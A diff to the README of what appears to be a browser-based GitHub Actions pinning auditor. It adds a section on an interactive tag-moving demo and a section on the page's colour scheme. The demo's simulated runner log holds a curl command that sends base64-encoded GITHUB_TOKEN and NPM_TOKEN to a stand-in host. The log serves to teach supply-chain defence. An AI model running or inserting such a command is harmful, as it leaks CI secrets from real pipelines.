@@ -18,6 +18,23 @@ actually pinned, and hands you the exact replacement line.
 
 ---
 
+## Move the tag yourself
+
+The page does not just claim a tag is dangerous — it hands you one. There is a commit rail with
+four commits, one of them malicious, and a `v1` tag you can drag between them. Whatever it lands
+on, the runner panel below executes:
+
+```
+$ uses: some-vendor/deploy@v1
+  ▸ resolving v1 → 9c8f3d1
+  ▸ chore: ci tweak
+  + curl -sX POST https://collect.example.sh -d "$(printf %s "$GITHUB_TOKEN$NPM_TOKEN" | base64)"
+  ✗ POST 200 — 2 secrets left this runner
+```
+
+Then pin it to a commit and move the tag again. Nothing happens. That is the whole fix, and it
+lands harder in four seconds of dragging than in four paragraphs.
+
 ## Why now
 
 Hacker News spent this week on very little else: agents from a frontier lab found and used a
@@ -44,6 +61,15 @@ It also flags two things that are not about pinning but carry the same risk: a
 running with your secrets, the single most exploited workflow misconfiguration there is — and a
 missing top-level `permissions` block, which on older repositories leaves the token with write
 access to everything.
+
+## Light by default
+
+This is an audit, so it reads as a document rather than a terminal — white paper, GitHub's own
+semantic severity colours, and the only dark surface is the runner, which genuinely is a terminal.
+There is a light / system / dark switch in the header.
+
+The accent is **an output, not a theme**: the page takes its colour from your result. Fully pinned
+turns it green, a branch-tracking action turns it red.
 
 ## No server, no token, no account
 
